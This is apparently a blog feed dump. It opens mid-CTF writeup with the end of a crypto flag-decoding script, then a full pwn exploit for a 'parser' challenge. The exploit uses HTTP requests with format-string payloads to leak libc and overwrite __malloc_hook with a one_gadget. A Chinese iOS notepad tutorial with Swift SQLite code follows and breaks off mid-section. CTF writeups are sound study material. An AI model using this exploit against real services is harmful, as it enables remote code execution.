<span class="keyword">for</span> perm <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>), repeat=<span class="number">3</span>):</span><br><span class="line">        poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)])</span><br><span class="line">        <span class="keyword">if</span> poly[<span class="number">0</span>] <span class="keyword">in</span> K:</span><br><span class="line">            res.append(R(poly))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_decode</span>(<span class="params">output, u, v</span>):</span></span><br><span class="line">    rs = [u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], v[<span class="number">0</span>], v[<span class="number">1</span>], v[<span class="number">2</span>]]</span><br><span class="line">    otp = struct.pack(<span class="string">&quot;&lt;QQQQQQ&quot;</span>, *rs)</span><br><span class="line">    plain = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        plain.append(output[i]^^otp[i%<span class="built_in">len</span>(otp)])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">output = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&quot;</span>)</span><br><span class="line">known_input = <span class="string">b&quot;aaaaaaaaaaaaaaaaaaaaflag&#123;&quot;</span></span><br><span class="line">u = get_u_from_out(output, known_input)</span><br><span class="line">vs = get_v_from_u(u)</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> vs:</span><br><span class="line">    <span class="built_in">print</span>(try_decode(output,u,v))</span><br></pre></td></tr></table></figure>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="parser"><a href="#parser" class="headerlink" title="parser"></a>parser</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">pdbg = pwn_debug(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">debug = <span class="number">3</span></span><br><span class="line"><span class="comment">#pdbg.context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">pdbg.local() </span><br><span class="line">pdbg.debug(<span class="string">&quot;2.27&quot;</span>)  <span class="comment">#2.23 ... 2.29</span></span><br><span class="line">pdbg.remote(<span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span>,xxx) <span class="comment">#IP,PORT</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    r = pdbg.run(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    r = pdbg.run(<span class="string">&quot;local&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = pdbg.run(<span class="string">&quot;remote&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr</span>):</span></span><br><span class="line">    pdbg.bp([addr])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span>(<span class="params">r</span>):</span></span><br><span class="line">    text_base = r.libs()[r._cwd+r.argv[<span class="number">0</span>].strip(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> r.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,r.libs()[key]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confirm</span>(<span class="params">address</span>):</span></span><br><span class="line">    n = <span class="built_in">globals</span>()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">&quot; ==&gt; &quot;</span>+<span class="built_in">hex</span>(address))</span><br><span class="line">    </span><br><span class="line">elf = pdbg.elf</span><br><span class="line">libc = pdbg.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendn</span>(<span class="params">content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a%234$p&quot;</span> </span><br><span class="line"><span class="comment">#confirm(ret_addr)</span></span><br><span class="line">sendn(payload1)</span><br><span class="line"><span class="comment"># 0x5da710</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;&gt;&quot;</span>,drop=<span class="number">1</span>),<span class="number">16</span>) - <span class="number">0x3e7638</span></span><br><span class="line">confirm(libc_base)</span><br><span class="line">one_getgad = libc_base + <span class="number">0x4f3c2</span></span><br><span class="line">confirm(one_getgad)</span><br><span class="line">payload2 = <span class="string">&quot;GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a&quot;</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">t1=one_getgad&amp;<span class="number">0xff</span></span><br><span class="line">payload2 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(t1) + <span class="string">&quot;c&quot;</span> +<span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">31</span>) + <span class="string">&#x27;$hhn&#x27;</span>  + <span class="string">&quot;a&quot;</span> * <span class="number">9</span> +  p64(malloc_hook) + <span class="string">&quot;a&quot;</span> *<span class="number">8</span></span><br><span class="line">confirm(malloc_hook)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">&quot;GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(t2) + <span class="string">&quot;c&quot;</span> +<span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">31</span>) + <span class="string">&#x27;$hhn&#x27;</span>  + <span class="string">&quot;a&quot;</span> * <span class="number">10</span> +  p64(malloc_hook+<span class="number">1</span>) + <span class="string">&quot;a&quot;</span> *<span class="number">8</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">&quot;GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(t2) + <span class="string">&quot;c&quot;</span> +<span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">31</span>) + <span class="string">&#x27;$hhn&#x27;</span>  + <span class="string">&quot;a&quot;</span> * <span class="number">10</span> +  p64(malloc_hook+<span class="number">2</span>) + <span class="string">&quot;a&quot;</span> *<span class="number">8</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">&quot;GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(t2) + <span class="string">&quot;c&quot;</span> +<span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">31</span>) + <span class="string">&#x27;$hhn&#x27;</span>  + <span class="string">&quot;a&quot;</span> * <span class="number">9</span> +  p64(malloc_hook+<span class="number">3</span>) + <span class="string">&quot;a&quot;</span> *<span class="number">8</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">32</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">&quot;GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(t2) + <span class="string">&quot;c&quot;</span> +<span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">31</span>) + <span class="string">&#x27;$hhn&#x27;</span>  + <span class="string">&quot;a&quot;</span> * <span class="number">9</span> +  p64(malloc_hook+<span class="number">4</span>) + <span class="string">&quot;a&quot;</span> *<span class="number">8</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">40</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">&quot;GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(t2) + <span class="string">&quot;c&quot;</span> +<span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">31</span>) + <span class="string">&#x27;$hhn&#x27;</span>  + <span class="string">&quot;a&quot;</span> * <span class="number">9</span> +  p64(malloc_hook+<span class="number">5</span>) + <span class="string">&quot;a&quot;</span> *<span class="number">8</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&quot;GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;%1000000c&quot;</span></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS_记事本开发</title>
    <url>/2020/12/27/iOS_notepad/</url>
    <content><![CDATA[<h2 id="关于启动页和APP图标的设置"><a href="#关于启动页和APP图标的设置" class="headerlink" title="关于启动页和APP图标的设置"></a>关于启动页和APP图标的设置</h2><p>之前在更换启动页内容的时候发现更新启动页图片之后iOS虚拟设备未能成功设置为新的启动页。<br>这里可以参考这个文章末尾的方法：<a href="https://www.jianshu.com/p/d34c36cd15fc">https://www.jianshu.com/p/d34c36cd15fc</a></p>
<h2 id="关于页面跳转的一些问题"><a href="#关于页面跳转的一些问题" class="headerlink" title="关于页面跳转的一些问题"></a>关于页面跳转的一些问题</h2><p>页面跳转的三种方式：<a href="https://blog.csdn.net/zcc9618/article/details/82968734">https://blog.csdn.net/zcc9618/article/details/82968734</a></p>
<p>页面跳转利用<code>prepare</code>方法以及<code>segue</code>传输数据时<code>identifier</code>值为空的解决办法：<a href="https://www.hangge.com/blog/cache/detail_720.html">https://www.hangge.com/blog/cache/detail_720.html</a></p>
<h2 id="Swift使用CoreData储存数据"><a href="#Swift使用CoreData储存数据" class="headerlink" title="Swift使用CoreData储存数据"></a>Swift使用CoreData储存数据</h2><p>这里可以直接作为swift的一种数据库来理解。就是swift有一个叫coredata的数据库，创建项目的时候有个默认未勾选的选项<code>use coredata</code>就是是否为项目创建一个这个数据库文件，没有勾选的话可以在<code>New File</code>中手动选择添加，都一样。</p>
<p>详细操作过程可以参考这篇文章：<a href="https://www.sohu.com/a/223213477_663371">https://www.sohu.com/a/223213477_663371</a><br>这里简单举例：</p>
<p><code>xcdatamodeld</code>即为<code>coredata</code>的数据库文件。在<code>name.xcdatamodeld</code>文件中设置数据表。建表的话鼠标点击<code>Add Entity</code>即可。然后添加相关<code>Attributes</code></p>
<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228125341.png" alt="20201228125341"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228123752.png" alt="20201228123752"></p>
<h2 id="一些小问题"><a href="#一些小问题" class="headerlink" title="一些小问题"></a>一些小问题</h2><p>代码中有些针对控件的操作需要用到控件的<code>identifier</code>来定位被操作的控件。控件的<code>identifier</code>默认一般为空，所以需要对其进行设置，设置的值和代码中定位控件用的值一样即可。这里用文本记事的例子举例：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228140046.png" alt="20201228140046"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228135652.png" alt="20201228135652"></p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>这里用的是分组！！！而非是文件夹！！！<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228142526.png" alt="20201228142526"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228142356.png" alt="20201228142356"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201228142425.png" alt="20201228142425"></p>
<h2 id="文本记事"><a href="#文本记事" class="headerlink" title="文本记事"></a>文本记事</h2><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>Note.swift</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Foundation</span><br><span class="line"><span class="keyword">import</span> SQLite3</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文本记事的数据结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Note</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> id: <span class="type">Int</span></span><br><span class="line">    <span class="keyword">var</span> contents: <span class="type">String</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文本记事数据库操作</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoteManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> database: <span class="type">OpaquePointer</span>!</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">let</span> main <span class="operator">=</span> <span class="type">NoteManager</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">init</span>()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">connect</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> database <span class="operator">!=</span> <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> databaseURL <span class="operator">=</span> <span class="keyword">try</span> <span class="type">FileManager</span>.default.url(for: .documentDirectory, in: .userDomainMask, appropriateFor: <span class="literal">nil</span>, create: <span class="literal">true</span>).appendingPathComponent(<span class="string">&quot;notes.sqlite3&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> sqlite3_open(databaseURL.path, <span class="operator">&amp;</span>database) <span class="operator">==</span> <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> sqlite3_exec(database, <span class="string">&quot;CREATE TABLE IF NOT EXISTS notes (contents TEXT)&quot;</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>) <span class="operator">==</span> <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">                    </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Could not create table&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Could not connect&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> <span class="keyword">let</span> error &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Could not create database <span class="subst">\(error)</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">create</span>()</span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        connect()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> statement: <span class="type">OpaquePointer</span>!</span><br><span class="line">        <span class="keyword">if</span> sqlite3_prepare_v2(database, <span class="string">&quot;INSERT INTO notes (contents) VALUES (&#x27;New note&#x27;)&quot;</span>, <span class="operator">-</span><span class="number">1</span>, <span class="operator">&amp;</span>statement, <span class="literal">nil</span>) <span class="operator">!=</span> <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Could not create query&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="operator">-</span><span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> sqlite3_step(statement)  <span class="operator">!=</span> <span class="type">SQLITE_DONE</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Could not insert note&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="operator">-</span><span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_finalize(statement)</span><br><span class="line">        <span class="keyword">return</span> <span class="type">Int</span>(sqlite3_last_insert_rowid(database))</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">getAllNotes</span>()</span> -&gt; [<span class="type">Note</span>] &#123;</span><br><span class="line">        connect()</span><br><span class="line">        <span class="keyword">var</span> result: [<span class="type">Note</span>] <span class="operator">=</span> []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> statement: <span class="type">OpaquePointer</span>!</span><br><span class="line">        <span class="keyword">if</span> sqlite3_prepare_v2(database, <span class="string">&quot;SELECT rowid, contents FROM notes&quot;</span>, <span class="operator">-</span><span class="number">1</span>, <span class="operator">&amp;</span>statement, <span class="literal">nil</span>) <span class="operator">!=</span> <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Eroor creating select&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> sqlite3_step(statement) <span class="operator">==</span> <span class="type">SQLITE_ROW</span> &#123;</span><br><span class="line">            result.append(<span class="type">Note</span>(id: <span class="type">Int</span>(sqlite3_column_int(statement, <span class="number">0</span>)), contents: <span class="type">String</span>(cString: sqlite3_column_text(statement, <span class="number">1</span>))))</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_finalize(statement)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">save</span>(<span class="params">note</span>: <span class="type">Note</span>)</span> &#123;</span><br><span class="line">        connect()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> statement: <span class="type">OpaquePointer</span>!</span><br><span class="line">        <span class="keyword">if</span> sqlite3_prepare_v2(database, <span class="string">&quot;UPDATE notes SET contents = ? WHERE rowid = ?&quot;</span>, <span class="operator">-</span><span class="number">1</span>, <span class="operator">&amp;</span>statement, <span class="literal">nil</span>) <span class="operator">!=</span> <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Could not create update statement&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_bind_text(statement, <span class="number">1</span>, <span class="type">NSString</span>(string: note.contents).utf8String, <span class="operator">-</span><span class="number">1</span>, <span class="literal">nil</span>)</span><br><span class="line">        sqlite3_bind_int(statement, <span class="number">2</span>, <span class="type">Int32</span>(note.id))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> sqlite3_step(statement)  <span class="operator">!=</span> <span class="type">SQLITE_DONE</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Could not update note&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_finalize(statement)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">delete</span>(<span class="params">note</span>: <span class="type">Note</span>)</span> &#123;</span><br><span class="line">        connect()</span><br><span class="line">        <span class="keyword">var</span> statement: <span class="type">OpaquePointer</span>!</span><br><span class="line">        <span class="keyword">if</span> sqlite3_prepare_v2(database, <span class="string">&quot;DELETE FROM notes WHERE rowid = ?&quot;</span>, <span class="operator">-</span><span class="number">1</span>, <span class="operator">&amp;</span>statement, <span class="literal">nil</span>) <span class="operator">!=</span> <span class="type">SQLITE_OK</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Could not create delete statement&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_bind_int(statement, <span class="number">1</span>, <span class="type">Int32</span>(note.id))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> sqlite3_step(statement)  <span class="operator">!=</span> <span class="type">SQLITE_DONE</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Could not delete note&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sqlite3_finalize(statement)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="文本列表界面"><a href="#文本列表界面" class="headerlink" title="文本列表界面"></a>文本列表界面</h3><p>ViewController.swift</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ViewController</span>: <span class="title">UITableViewController</span>, <span class="title">UISearchBarDelegate</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> notes: [<span class="type">Note</span>] <span class="operator">=</span> []</span><br><span class="line">    <span class="keyword">var</span> notesBackup: [<span class="type">Note</span>] <span class="operator">=</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 搜索框</span></span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">var</span> searchBar: <span class="type">UISearchBar</span>!</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">searchBar</span>(<span class="keyword">_</span> <span class="params">searchBar</span>: <span class="type">UISearchBar</span>, <span class="params">textDidChange</span> <span class="params">searchText</span>: <span class="type">String</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> searchText <span class="operator">==</span> <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">            notes <span class="operator">=</span> notesBackup</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            notes <span class="operator">=</span> []</span><br><span class="line">            <span class="keyword">for</span> note: <span class="type">Note</span> <span class="keyword">in</span> notesBackup &#123;</span><br><span class="line">                <span class="keyword">if</span> note.contents.lowercased().contains(searchText.lowercased()) &#123;</span><br><span class="line">                    notes.append(note)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tableView.reloadData()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建一条新笔记</span></span><br><span class="line">    <span class="keyword">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">createNote</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">_</span> <span class="operator">=</span> <span class="type">NoteManager</span>.main.create()</span><br><span class="line">        reload()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewWillAppear</span>(<span class="keyword">_</span> <span class="params">animated</span>: <span class="type">Bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewWillAppear(<span class="literal">true</span>)</span><br><span class="line">        reload()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        searchBar.delegate <span class="operator">=</span> <span class="keyword">self</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">numberOfSections</span>(<span class="params">in</span> <span class="params">tableView</span>: <span class="type">UITableView</span>)</span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">numberOfRowsInSection</span> <span class="params">section</span>: <span class="type">Int</span>)</span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> notes.count</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 让每一个tableCell显示对应文本笔记的内容</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">cellForRowAt</span> <span class="params">indexPath</span>: <span class="type">IndexPath</span>)</span> -&gt; <span class="type">UITableViewCell</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cell <span class="operator">=</span> tableView.dequeueReusableCell(withIdentifier: <span class="string">&quot;NoteCell&quot;</span>, for: indexPath)</span><br><span class="line">        cell.textLabel<span class="operator">?</span>.text <span class="operator">=</span> notes[indexPath.row].contents</span><br><span class="line">        <span class="keyword">return</span> cell</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重载页面</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">reload</span>()</span> &#123;</span><br><span class="line">        notes <span class="operator">=</span> <span class="type">NoteManager</span>.main.getAllNotes()</span><br><span class="line">        notesBackup <span class="operator">=</span> <span class="type">NoteManager</span>.main.getAllNotes()</span><br><span class="line">        <span class="keyword">self</span>.tableView.reloadData()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 页面跳转时把对应笔记b写入新页面</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">prepare</span>(<span class="params">for</span> <span class="params">segue</span>: <span class="type">UIStoryboardSegue</span>, <span class="params">sender</span>: <span class="keyword">Any</span><span class="operator">?</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> segue.identifier <span class="operator">==</span> <span class="string">&quot;NoteSegue&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> destination <span class="operator">=</span> segue.destination <span class="keyword">as?</span> <span class="type">NoteViewController</span> &#123;</span><br><span class="line">                destination.note <span class="operator">=</span> notes[tableView.indexPathForSelectedRow<span class="operator">!</span>.row]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="文本详情界面"><a href="#文本详情界面" class="headerlink" title="文本详情界面"></a>文本详情界面</h3><p>NoteViewController.swift</p>
